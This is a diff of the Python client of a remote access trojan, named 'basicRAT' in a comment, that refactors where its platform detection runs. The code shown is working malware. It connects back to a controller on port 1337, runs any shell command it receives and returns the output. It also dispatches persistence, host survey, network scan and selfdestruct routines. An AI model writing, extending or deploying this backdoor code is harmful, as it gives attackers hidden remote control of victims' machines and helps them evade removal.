@@ -20,8 +20,18 @@ PORT = 1337
 # seconds to wait before client will attempt to reconnect
 CONN_TIMEOUT = 30
 
+# determine system platform
+if sys.platform.startswith('win'):
+    PLAT = 'win'
+elif sys.platform.startswith('linux'):
+    PLAT = 'nix'
+elif sys.platform.startswith('darwin'):
+    PLAT = 'mac'
+else:
+    PLAT = 'unk'
 
-def client_loop(conn, plat):
+
+def client_loop(conn):
     while True:
         results = ''
         
@@ -35,25 +45,26 @@ def client_loop(conn, plat):
             results = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read()
-    
+            results = results.stdout.read() + results.stderr.read() + \
+                      '\n"{}" completed.'.format(action)
+        
         elif cmd == 'kill':
             conn.close()
             sys.exit(0)
-        
+    
         elif cmd == 'goodbye':
             conn.shutdown(socket.SHUT_RDWR)
             conn.close()
             break
     
         elif cmd == 'persistence':
-            results = persistence.run(plat)
+            results = persistence.run(PLAT)
     
         elif cmd == 'scan':
             results = scan.single_host(action)
     
         elif cmd == 'survey':
-            results = survey.run(plat)
+            results = survey.run(PLAT)
     
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
@@ -63,23 +74,12 @@ def client_loop(conn, plat):
     
         elif cmd == 'selfdestruct':
             conn.close()
-            toolkit.selfdestruct(plat)
+            toolkit.selfdestruct(PLAT)
     
         conn.send(results)
 
 
 def main():
-    # determine system platform
-    plat = sys.platform
-    if plat.startswith('win'):
-        plat = 'win'
-    elif plat.startswith('linux'):
-        plat = 'nix'
-    elif plat.startswith('darwin'):
-        plat = 'mac'
-    else:
-        plat = 'unk'
-    
     # connect to basicRAT server
     while True:
         conn = socket.socket()
@@ -90,7 +90,7 @@ def main():
             continue
         # conn.setblocking(0)
     
-        client_loop(conn, plat)
+        client_loop(conn)
 
 
 if __name__ == '__main__':
